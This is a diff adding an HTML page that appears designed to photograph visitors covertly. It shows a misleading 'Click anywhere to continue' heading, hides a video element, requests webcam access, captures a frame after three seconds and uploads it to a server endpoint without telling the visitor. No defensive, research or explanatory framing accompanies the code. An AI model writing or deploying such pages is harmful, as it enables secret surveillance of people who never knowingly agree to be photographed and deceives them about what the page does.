@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Click anywhere to continue...</h1>
+  <video id="video" width="640" height="480" autoplay style="display: none;"></video>
+  <script>
+    const video = document.getElementById('video');
+
+    // Request access to the webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // Automatically capture an image after a short delay
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = 640;
+          canvas.height = 480;
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, 640, 480);
+
+          // Convert the image to a data URL
+          const imageDataUrl = canvas.toDataURL('image/png');
+
+          // Send the image data to your server
+          fetch('http://localhost:3000/upload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageDataUrl })
+          }).then(response => {
+            if (response.ok) {
+              console.log('Image sent successfully');
+            } else {
+              console.error('Failed to send image');
+            }
+          }).catch(error => {
+            console.error('Error:', error);
+          });
+
+        }, 3000); // Adjust the delay as needed
+      })
+      .catch(error => {
+        console.error('Error accessing webcam:', error);
+      });
+  </script>
+</body>
+</html>
